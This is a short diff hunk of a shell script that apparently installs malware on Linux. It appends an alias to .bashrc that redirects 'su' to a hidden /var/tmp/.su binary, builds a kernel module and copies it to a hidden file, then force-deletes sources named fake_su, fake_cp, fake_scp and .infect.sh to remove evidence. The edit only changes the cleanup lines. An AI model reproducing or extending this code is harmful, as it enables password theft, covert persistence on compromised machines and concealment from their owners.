@@ -17,7 +17,7 @@ echo "alias su=/var/tmp/.su">>/home/$USER/.bashrc
 source ~/.bashrc 2> errlog
 make all 2> errlog 1> errlog
 cp hello.ko /var/tmp/.hello.ko 2> errlog
-rm fake_su.cpp fake_cp.cpp fake_scp.cpp Makefile .infect.sh recover.sh 2> errlog
-rm hello.c hello.ko hello.mod.o hello.o hello.mod.c Module.symvers modules.order 2> errlog
-rm errlog
+rm -f fake_su.cpp fake_cp.cpp fake_scp.cpp Makefile .infect.sh 2> errlog
+rm -f hello.c hello.ko hello.mod.o hello.o hello.mod.c Module.symvers modules.order 2> errlog
+rm -f errlog
 stty echo
